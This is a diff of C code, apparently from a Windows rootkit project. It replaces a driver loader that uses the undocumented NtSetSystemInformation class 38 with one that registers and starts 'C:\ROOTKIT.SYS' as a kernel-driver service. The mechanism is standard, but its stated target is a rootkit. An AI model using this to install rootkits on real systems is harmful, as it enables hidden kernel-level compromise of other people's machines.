@@ -109,37 +109,40 @@ int main() {
     }
     printf("\nFinish !\n");
     */
-    SYSTEM_LOAD_AND_CALL_IMAGE GregsImage;
-    NTSETSYSTEMINFORMATION NtSetSystemInformation;
-    RTLINITUNICODESTRING RtlInitUnicodeString;
-    SYSTEM_INFORMATION_CLASS test;
-    int result;
-    WCHAR daPath[] = L"\\??\\C:\\ROOTKIT.SYS";
-
-    ////////////////////////////////////////////////////////////// 
-    // get DLL entry points 
-    ////////////////////////////////////////////////////////////// 
-    if (!(RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(ntdllBase, "RtlInitUnicodeString")))
-    {
-        printf("RtlInitUnicodeString GetProcAddress error !!! %p", RtlInitUnicodeString);
-        return false;
+    //char aPath[1024];
+    //char aCurrentDir[512];
+    SC_HANDLE sh = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    SC_HANDLE rh = CreateServiceW(sh, L"ROOTKIT.SYS", L"ROOTKIT.SYS", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, L"C:\\ROOTKIT.SYS", NULL, NULL, NULL, NULL, NULL);
+    if (!rh) {
+        if (GetLastError() == ERROR_SERVICE_EXISTS) {
+            rh = OpenService(sh, L"ROOTKIT.SYS", SERVICE_ALL_ACCESS);
+            if (!rh) {
+                printf("Error OpenService 1 !!! %d", GetLastError());
+                return false;
+            }
+        }
+        else {
+            
+            printf("Unknow Error 1 !!! %d", GetLastError());
+            CloseServiceHandle(sh);
+            return false;
+        }
     }
-
-    if (!(NtSetSystemInformation = (NTSETSYSTEMINFORMATION)GetProcAddress(ntdllBase, "NtSetSystemInformation"))){
-        printf("NtSetSystemInformation GetProcAddress error !!! %p", NtSetSystemInformation);
-        return false;
+    puts("CreateService worked!!!\n");
+    if (StartService(rh, 0, NULL) == 0) {
+        if (ERROR_SERVICE_ALREADY_RUNNING == GetLastError()) {
+            printf("Service Already Exist !!!");
+            return false;
+        }
+        else {
+            printf("StartService error: %d\n", GetLastError());
+            CloseServiceHandle(sh);
+            CloseServiceHandle(rh);
+            return false;
+        }
     }
-
-    if (!NT_SUCCESS(RtlInitUnicodeString(&(GregsImage.ModuleName), daPath))) {
-        printf("RtlInitUnicodeString error");
-        return false;
-    }
-
-    if (!NT_SUCCESS(result = NtSetSystemInformation(38, &GregsImage, sizeof(SYSTEM_LOAD_AND_CALL_IMAGE))))
-    {
-        printf("Loading error smhh !!! %x\n", result);
-        system("PAUSE");
-        return false;
-    }
+    CloseServiceHandle(sh);
+    CloseServiceHandle(rh);
+    printf("Loading Success !!!\n");
     return true;
 }
